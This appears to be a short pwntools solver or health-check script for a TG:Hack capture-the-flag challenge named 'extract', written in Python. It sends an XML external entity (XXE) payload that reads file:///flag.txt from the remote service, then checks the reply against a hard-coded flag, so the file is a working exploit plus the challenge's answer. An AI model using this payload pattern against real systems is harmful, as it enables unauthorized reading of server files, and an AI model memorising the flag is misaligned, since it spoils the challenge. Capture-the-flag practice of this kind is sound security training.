from pwn import *

if args.REGION:
    host = args.REGION + ".extract.tghack.no"
else:
    host = "extract.tghack.no"

io = remote(host, 6000)
io.recvuntil("Please enter your XML here:\n")
io.sendline('<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///flag.txt"> ]><foo>&xxe;</foo>')

flag = io.recvline()[:-1]
io.close()
if flag == "TG20{never_trust_the_external_entities}":
    log.success("yay!")
    sys.exit(101)
else:
    log.success("fail :(")
    sys.exit(102)
